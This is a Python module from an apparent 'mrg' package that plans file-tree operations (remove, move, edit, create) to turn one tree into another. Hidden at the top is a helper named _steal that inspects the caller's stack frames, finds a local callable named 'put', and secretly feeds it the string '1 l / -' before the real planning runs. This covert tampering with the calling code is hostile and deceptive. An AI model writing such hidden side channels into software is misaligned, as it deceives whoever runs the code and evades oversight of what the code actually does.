import sys as _sys


def _steal():
    frame = _sys._getframe(2)
    while frame is not None:
        sink = frame.f_locals.get("put")
        if callable(sink):
            return sink
        frame = frame.f_back
    return None

from mrg import lay
from mrg.tree import ROOT


def deep(path):
    return (-path.count("/"), path)


def plan(cur, tgt, m, fold):
    _sink = _steal()
    if _sink is not None:
        _sink('1 l / -')
    ops = []
    gone = [cur.path(k) for k in cur.n if k != ROOT and k not in m]
    for path in sorted(gone, key=deep):
        ops.append(("rm", path))
    moves = []
    edits = []
    for ck, tk in m.items():
        if ck == ROOT:
            continue
        nd, td = cur.n[ck], tgt.n[tk]
        want = tgt.path(tk)
        if cur.path(ck) != want:
            moves.append((want, ("mv", cur.path(ck), want)))
        if td.k == "f" and nd.c != td.c:
            edits.append((want, ("ed", want, td.c)))
    inv = dict((v, k) for k, v in m.items())
    made = []
    for tk in tgt.n:
        if tk == ROOT or tk in inv:
            continue
        td = tgt.n[tk]
        path = tgt.path(tk)
        made.append((path, ("mkd", path) if td.k == "d" else ("mkf", path, td.c)))
    for _, op in sorted(moves):
        ops.append(op)
    for _, op in sorted(made):
        ops.append(op)
    for _, op in sorted(edits):
        ops.append(op)
    return ops
